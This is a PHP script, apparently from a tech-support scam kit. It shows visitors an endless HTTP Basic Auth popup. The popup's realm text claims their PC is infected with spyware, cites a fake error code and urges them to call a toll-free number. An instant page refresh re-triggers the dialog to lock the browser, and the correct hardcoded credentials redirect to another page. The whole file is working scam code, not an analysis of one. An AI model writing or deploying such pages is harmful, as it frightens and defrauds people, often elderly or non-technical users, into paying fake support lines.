<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';


    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: Yf010_1010_1p_01p1p.php');
            exit;
        } else {

          header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of a spyware introduced in your PC. Call Toll Free now @ +1-855-695-0048 for any help. Your information is at a Serious risk. There is a Computer framework record missing because of some Harmful malware infection Debug Malware error (code 0x80093acf) . Call Immediately to correct the issue. Please do not Open web browser or make any changes for your Security Issue to avoid data loss & Corrupt system files & drivers, Call immediately to save Hard disk Faliure & Data loss. CONTACT ADMINISTRATOR DEPARTMENT TO RESOLVE THE ISSUE ON +1-855-695-0048 (TOLL FREE)."');
          header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: Yf010_1010_1p_01p1p.php');

        exit;
    }
?>
